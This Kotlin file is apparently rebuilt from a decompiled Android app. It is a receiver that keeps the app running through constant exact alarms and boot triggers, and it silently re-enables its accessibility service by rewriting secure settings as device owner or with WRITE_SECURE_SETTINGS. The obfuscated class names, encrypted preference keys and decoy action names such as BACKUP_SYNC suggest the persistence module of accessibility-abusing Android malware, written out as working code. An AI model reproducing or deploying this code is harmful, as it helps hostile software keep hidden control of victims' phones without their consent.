package com.storm.safe.rock.service

import android.app.AlarmManager
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.PowerManager
import android.os.SystemClock
import android.provider.Settings
import android.util.Log
import com.storm.safe.rock.receiver.zbrefryi
import com.storm.safe.rock.service.modules.NetworkManager
import com.storm.safe.rock.util.StringUtil

/**
 * BroadcastReceiver for alarm-based heartbeat and guard scheduling.
 *
 * Reverse-engineered from JADX: service/tisxhskrc.java (325 LOC).
 *
 * Listens for:
 * - BACKUP_SYNC (heartbeat alarm)
 * - QUICK_SYNC
 * - HEALTH_CHECK
 * - BOOT_COMPLETED (and quickboot variants)
 *
 * Manages:
 * - AlarmManager heartbeat chain (exact alarms)
 * - Guard alarm scheduling
 * - Force rebind of accessibility service via DevicePolicyManager or Settings.Secure
 * - AppCoreService startup
 */
class tisxhskrc : BroadcastReceiver() {

    companion object {
        private const val TAG = "tisxhskrc"

        const val ACTION_BACKUP_SYNC = "com.storm.safe.rock.action.BACKUP_SYNC"
        const val ACTION_QUICK_SYNC = "com.storm.safe.rock.action.QUICK_SYNC"
        const val ACTION_HEALTH_CHECK = "com.storm.safe.rock.action.HEALTH_CHECK"

        private const val HEARTBEAT_REQUEST_CODE = 99
        private const val GUARD_REQUEST_CODE = 97

        /** Interactive heartbeat/guard interval */
        private const val INTERACTIVE_INTERVAL = 2_000L

        /** Screen-off heartbeat interval: 5 minutes */
        private const val SCREEN_OFF_HEARTBEAT_INTERVAL = 300_000L

        /** Screen-off guard interval: 5 minutes */
        private const val SCREEN_OFF_GUARD_INTERVAL = 300_000L

        /** Accessibility-dead heartbeat interval: 60 seconds */
        private const val ACCESSIBILITY_DEAD_HEARTBEAT_INTERVAL = 60_000L

        /** Accessibility-dead guard interval: 2 seconds */
        private const val ACCESSIBILITY_DEAD_GUARD_INTERVAL = 2_000L

        /** Minimum rebind wait: 5 seconds */
        private const val REBIND_WAIT_THRESHOLD_MS = 5_000L

        /** Sleep between remove and re-add in rebind: 300ms */
        private const val REBIND_SLEEP_MS = 300L

        /** Timestamp of last confirmed alive state */
        @Volatile
        @JvmStatic
        var lastAliveTimestamp: Long = System.currentTimeMillis()

        /** Whether a rebind attempt is in progress */
        @Volatile
        @JvmStatic
        var isRebinding: Boolean = false

        // ── Interval calculation ──

        /**
         * Effective guard interval depends on accessibility state and screen state.
         * JADX: C0380a0.effectiveGuardIntervalMs
         */
        private fun effectiveGuardIntervalMs(context: Context): Long {
            if (MyAccessibilityService.getInstance() == null) return ACCESSIBILITY_DEAD_GUARD_INTERVAL
            val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
            return if (pm == null || pm.isInteractive) INTERACTIVE_INTERVAL else SCREEN_OFF_GUARD_INTERVAL
        }

        /**
         * Effective heartbeat interval depends on accessibility state and screen state.
         * JADX: C0380a0.effectiveHeartbeatIntervalMs
         */
        private fun effectiveHeartbeatIntervalMs(context: Context): Long {
            if (MyAccessibilityService.getInstance() == null) return ACCESSIBILITY_DEAD_HEARTBEAT_INTERVAL
            val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
            return if (pm == null || pm.isInteractive) ACCESSIBILITY_DEAD_HEARTBEAT_INTERVAL else SCREEN_OFF_HEARTBEAT_INTERVAL
        }

        /**
         * Check if this app is listed in enabled accessibility services.
         * JADX: C0380a0.isAccessibilityEnabledInSettings
         */
        private fun isAccessibilityEnabledInSettings(context: Context): Boolean {
            return try {
                val enabled = Settings.Secure.getString(
                    context.contentResolver, "enabled_accessibility_services"
                ) ?: ""
                val pkg = context.packageName
                enabled.contains(pkg)
            } catch (_: Exception) {
                false
            }
        }

        // ── Scheduling ──

        /**
         * Schedule next heartbeat alarm.
         * JADX: C0380a0.scheduleNextHeartbeatStatic
         */
        @JvmStatic
        fun scheduleNextHeartbeat(context: Context) {
            try {
                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager
                    ?: return
                val intent = Intent(context, tisxhskrc::class.java).apply {
                    action = ACTION_BACKUP_SYNC
                }
                val pi = PendingIntent.getBroadcast(
                    context, HEARTBEAT_REQUEST_CODE, intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                )
                val interval = effectiveHeartbeatIntervalMs(context)
                val triggerAt = SystemClock.elapsedRealtime() + interval
                val canExact = if (Build.VERSION.SDK_INT >= 31) alarmManager.canScheduleExactAlarms() else true
                if (canExact) {
                    alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi
                    )
                } else {
                    alarmManager.setAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi
                    )
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ 心跳闹钟调度失败", e)
            }
        }

        /**
         * Schedule guard alarm.
         * JADX: C0380a0.scheduleGuard
         */
        @JvmStatic
        fun scheduleGuard(context: Context) {
            try {
                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager
                    ?: return
                val intent = Intent(context, tisxhskrc::class.java).apply {
                    action = ACTION_BACKUP_SYNC
                }
                val pi = PendingIntent.getBroadcast(
                    context, GUARD_REQUEST_CODE, intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                )
                val interval = effectiveGuardIntervalMs(context)
                val triggerAt = SystemClock.elapsedRealtime() + interval
                val canExact = if (Build.VERSION.SDK_INT >= 31) alarmManager.canScheduleExactAlarms() else true
                if (canExact) {
                    alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi
                    )
                } else {
                    alarmManager.setAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi
                    )
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ 守护闹钟调度失败", e)
            }
        }

        /**
         * Reschedule heartbeat and guard after screen on.
         * JADX: C0380a0.rescheduleAfterScreenOn
         */
        @JvmStatic
        fun rescheduleAfterScreenOn(context: Context) {
            try {
                scheduleNextHeartbeat(context)
                scheduleGuard(context)
            } catch (e: Exception) {
                Log.e(TAG, "❌ 亮屏重排闹钟失败", e)
            }
        }

        /**
         * Try to force rebind accessibility service by toggling enabled_accessibility_services.
         * JADX: C0380a0.tryForceRebindAccessibility
         */
        @JvmStatic
        fun tryForceRebindAccessibility(context: Context) {
            if (isRebinding) return
            if (MyAccessibilityService.getInstance() != null) return

            val appContext = context.applicationContext
            if (!isAccessibilityEnabledInSettings(appContext)) return

            isRebinding = true
            Thread {
                doForceRebindAccessibility(appContext)
            }.start()
        }

        /**
         * Actual rebind logic — runs on background thread.
         * JADX: C0380a0.tryForceRebindAccessibility$lambda$3
         *
         * Strategy: remove our entry from enabled_accessibility_services,
         * sleep 300ms, re-add it. Uses DevicePolicyManager if device owner,
         * falls back to Settings.Secure.putString.
         */
        private fun doForceRebindAccessibility(context: Context) {
            try {
                val contentResolver = context.contentResolver
                val pkg = context.packageName
                val fullService = "$pkg/${MyAccessibilityService::class.java.name}"

                val current = Settings.Secure.getString(
                    contentResolver, "enabled_accessibility_services"
                ) ?: ""

                if (!current.contains(pkg)) {
                    Log.w(TAG, "⚠️ [重绑] 无障碍列表中未找到本应用，跳过")
                    return
                }

                // Build service list without our package
                val otherServices = current.split(":")
                    .filter { it.isNotEmpty() && !it.contains(pkg) }
                val withoutUs = otherServices.joinToString(":")

                // Build full list with our service
                val withUs = if (withoutUs.isNotEmpty()) "$withoutUs:$fullService" else fullService

                // Try DevicePolicyManager first (device owner)
                val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                if (dpm != null && dpm.isDeviceOwnerApp(pkg)) {
                    val cn = ComponentName(context, zbrefryi::class.java)
                    dpm.setSecureSetting(cn, "enabled_accessibility_services", withoutUs)
                    Thread.sleep(REBIND_SLEEP_MS)
                    dpm.setSecureSetting(cn, "enabled_accessibility_services", withUs)
                    dpm.setSecureSetting(cn, "accessibility_enabled", "1")
                    Log.d(TAG, "✅ [重绑] DeviceOwner 先删后加成功")
                    return
                }

                // Fallback: WRITE_SECURE_SETTINGS permission
                try {
                    Settings.Secure.putString(
                        contentResolver, "enabled_accessibility_services", withoutUs
                    )
                    Thread.sleep(REBIND_SLEEP_MS)
                    Settings.Secure.putString(
                        contentResolver, "enabled_accessibility_services", withUs
                    )
                    Settings.Secure.putInt(contentResolver, "accessibility_enabled", 1)
                    Log.d(TAG, "✅ [重绑] WRITE_SECURE_SETTINGS 先删后加成功")
                } catch (_: SecurityException) {
                    Log.w(TAG, "⚠️ [重绑] 无权限，等待系统自动恢复")
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ [重绑] 失败", e)
            } finally {
                isRebinding = false
            }
        }

        /**
         * Handle heartbeat alarm — schedule next, ensure core service running,
         * check accessibility, and optionally reconnect network.
         * JADX: m212466a0 (static)
         */
        @JvmStatic
        fun handleBackupSync(context: Context) {
            scheduleNextHeartbeat(context)
            scheduleGuard(context)

            if (!AppCoreService.isRunning()) {
                AppCoreService.start(context)
            }

            if (MyAccessibilityService.getInstance() == null) {
                val elapsed = System.currentTimeMillis() - lastAliveTimestamp
                if (elapsed > REBIND_WAIT_THRESHOLD_MS) {
                    Log.w(TAG, "⚠️ 无障碍未绑定(${elapsed / 1000}s)，尝试强制重绑")
                    tryForceRebindAccessibility(context)
                }
                return
            }

            // Accessibility is alive — reset rebinding flag
            isRebinding = false

            // Check network connectivity and reconnect if needed
            // JADX: reads SharedPreferences with encrypted keys, checks NetworkManager.isConnected
            try {
                val prefs = context.getSharedPreferences(
                    StringUtil.decrypt("KkkBBV4sDTpS"), Context.MODE_PRIVATE
                )
                val autoConnect = prefs.getBoolean(
                    StringUtil.decrypt("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false
                )
                if (!autoConnect) return

                val networkManager = MyAccessibilityService.getInstance()?.getNetworkManager()
                if (networkManager != null && !networkManager.isHealthy()) {
                    Thread { networkManager.ensureConnected() }.start()
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ 网络检查失败", e)
            }
        }
    }

    override fun onReceive(context: Context, intent: Intent?) {
        val action = intent?.action

        when (action) {
            ACTION_BACKUP_SYNC -> {
                handleBackupSync(context)
            }

            "android.intent.action.BOOT_COMPLETED",
            "android.intent.action.QUICKBOOT_POWERON",
            "com.htc.intent.action.QUICKBOOT_POWERON" -> {
                Log.d(TAG, "📱 开机完成，启动服务")
                lastAliveTimestamp = System.currentTimeMillis()
                isRebinding = false
                scheduleNextHeartbeat(context)
                scheduleGuard(context)
                if (!AppCoreService.isRunning()) {
                    AppCoreService.start(context)
                }
            }

            ACTION_QUICK_SYNC -> {
                handleBackupSync(context)
            }

            ACTION_HEALTH_CHECK -> {
                lastAliveTimestamp = System.currentTimeMillis()
                isRebinding = false
                scheduleNextHeartbeat(context)
                scheduleGuard(context)
                if (!AppCoreService.isRunning()) {
                    AppCoreService.start(context)
                }
            }

            else -> {
                // Null action or unknown — treat as heartbeat
                handleBackupSync(context)
            }
        }
    }
}
